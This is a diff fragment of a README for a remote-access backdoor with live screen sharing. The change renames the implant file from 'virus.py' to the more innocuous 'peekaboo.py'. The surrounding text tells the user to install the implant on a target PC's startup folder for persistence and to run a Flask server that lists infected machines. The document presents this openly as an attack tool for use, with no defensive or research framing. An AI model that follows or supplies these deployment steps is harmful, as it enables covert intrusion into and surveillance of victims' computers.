@@ -5,7 +5,7 @@ A Persistence maintaining backdoor which gives live screen sharing and remote de
 <br>
 `SETUP: -`
 
-Install `virus.py` in the target pc and preferably store it in the startup folder of the target pc for easy future access.
+Install `peekaboo.py` in the target pc and preferably store it in the startup folder of the target pc for easy future access.
 
 APP.PY - 
 Run `flask run -h <your url>` to start the server and you will start seeing usernames of the PC's in which the virus is installed.
